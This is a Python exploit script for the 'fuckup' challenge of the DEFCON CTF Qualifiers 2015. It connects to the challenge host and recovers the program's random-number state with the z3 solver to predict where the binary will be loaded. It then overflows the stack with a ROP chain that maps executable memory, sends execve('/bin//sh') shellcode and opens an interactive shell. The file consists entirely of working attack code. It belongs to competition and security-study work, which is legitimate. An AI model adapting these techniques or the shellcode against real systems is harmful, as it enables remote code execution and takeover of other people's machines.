#!/usr/bin/env python
#coding: UTF-8
#
# Exploit for 'fuckup', DEFCON CTF Qualifiers 2015
#
# Copyright (c) 2015 Samuel Groß
#

import struct
import re
import socket
import telnetlib
import z3

TARGET = ('fuckup_56f604b0ea918206dcb332339a819344.quals.shallweplayaga.me', 2000)
s = socket.create_connection(TARGET)

def e(s):
    return s.encode('UTF-8')

def d(s):
    return s.decode('UTF-8')

def p(d, fmt='<I'):
    return struct.pack(fmt, d)

def u(d, fmt='<I'):
    return struct.unpack(fmt, d)

def u1(d, fmt='<I'):
    return u(d, fmt)[0]

def readtil(delim):
    buf = b''
    while not e(delim) in buf:
        buf += s.recv(1)
    return buf

def send(p):
    s.sendall(p)

def sendln(b):
    if isinstance(b, bytes):
        s.sendall(b + b'\n')
    else:
        s.sendall(e(b) + b'\n')

def sendnum(n):
    sendln(str(n))

def prng(state, idx):
    current_idx = (idx + 0xf) & 0xf
    current_value = state[current_idx]

    edx = state[idx]
    eax = (idx + 0xd) & 0xf
    ecx = state[eax]
    eax = edx
    eax = (eax << 0x10) & 0xffffffff
    eax = eax ^ edx
    eax = eax ^ ecx
    edx = eax
    eax = ecx
    eax = (eax << 0xf) & 0xffffffff
    eax = eax ^ edx
    ebx = (idx + 0xa) & 0xf
    edx = (idx + 0x9) & 0xf
    edx = state[edx]
    ecx = edx
    ecx = (ecx >> 0xb) & 0xffffffff
    ecx = ecx ^ edx
    edx = eax
    edx = edx ^ ecx
    ecx = (ecx << 0x1c) & 0xffffffff
    state[ebx] = edx
    esi = current_value
    ebx = (esi * 4) & 0xffffffff
    ebx = ebx ^ esi
    ebx = ebx ^ eax
    eax = (eax << 0x12) & 0xffffffff
    ebx = ebx ^ edx
    edx = (edx << 5) & 0xffffffff
    eax = eax ^ ebx
    ebx = ecx
    edx = edx & 0xDA442D24
    ebx = ebx ^ eax
    eax = ebx
    eax = eax ^ edx
    state[current_idx] = eax
    return current_idx

def prngz3(state, idx):
    current_idx = (idx + 0xf) & 0xf
    current_value = state[current_idx]

    edx = state[idx]
    eax = (idx + 0xd) & 0xf
    ecx = state[eax]
    eax = edx
    eax = eax << 0x10
    eax = eax ^ edx
    eax = eax ^ ecx
    edx = eax
    eax = ecx
    eax = eax << 0xf
    eax = eax ^ edx
    ebx = (idx + 0xa) & 0xf
    edx = (idx + 0x9) & 0xf
    edx = state[edx]
    ecx = edx
    #ecx = (ecx >> 0xb) & 0xffffffff
    ecx = z3.LShR(ecx, 0xb)
    ecx = ecx ^ edx
    edx = eax
    edx = edx ^ ecx
    ecx = ecx << 0x1c
    state[ebx] = edx
    esi = current_value
    ebx = esi * 4
    ebx = ebx ^ esi
    ebx = ebx ^ eax
    eax = eax << 0x12
    ebx = ebx ^ edx
    edx = edx << 5
    eax = eax ^ ebx
    ebx = ecx
    edx = edx & 0xDA442D24
    ebx = ebx ^ eax
    eax = ebx
    eax = eax ^ edx
    state[current_idx] = eax
    return current_idx

def view_state():
    sendnum(3)
    resp = readtil('Quit\n')
    return int(re.match('Current Random: ([a-f0-9]+).*', d(resp)).group(1), 16) + 1

def smash_stack(payload):
    sendnum(4)
    readtil('This will crash however the location of the stack and binary are unknown to stop code execution')
    send(payload + b'A' * (100 - len(payload)))

def exit():
    sendnum(0)

def pwn():
    readtil('Quit\n')

    # Instantiate SMT solver to recover the PRNG state and subsequently
    # be able to calculate the next address the binary will rebase to
    solver = z3.Solver()
    prevstate = z3.BitVecs('x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15', 32)
    variables = prevstate[:]

    # Feed solver the observed values
    idx = 15
    for i in range(16):
        idx = prngz3(prevstate, idx)
        curr_value = view_state()
        solver.add(prevstate[idx] == curr_value)

    # Solve all the things!
    assert solver.check() == z3.sat
    print("[+] State sucessfully recovered")

    # Extract previous state ...
    state = []
    for v in variables:
        if solver.model()[v]:
            state.append(solver.model()[v].as_long())
        else:
            # One variable can't be recovered as it is overwritten before
            # being used in any operation. Obviously no big deal though.
            state.append(0)

    # ... and forward to current state
    idx = 15
    for i in range(16):
        idx = prng(state, idx)

    # Verify that everything works
    idx = prng(state, idx)
    assert state[idx] == view_state()
    print("[+] Able to predict future PRNG output")


    # Calculate next base and pwn the process with a simple ropchain.

    # Binary calls rand() once for every byte it receives...
    for i in range(101):
        idx = prng(state, idx)

    base = state[idx] & ~0xfff
    print("[+] Next base address: 0x{:x}".format(base))

    mmap = 0x754
    read = 0x8af
    adjust = 0x1d73     # esp += 28

    rop = b'A' * 22
    rop += p(base + mmap)
    rop += p(base + adjust)
    rop += p(0x31337000)
    rop += p(0x1000)
    rop += p(0x7)
    rop += p(0x20 | 0x10 | 0x2)
    rop += p(0xffffffff)
    rop += p(0)
    rop += p(0x41414141)
    rop += p(base + read)
    rop += p(0x31337000)
    rop += p(0)
    rop += p(0x31337000)
    rop += p(0x1000)

    smash_stack(rop)

    # the standard stuff
    sc = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
    send(sc)

    print("*** pwned ***")
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

pwn()
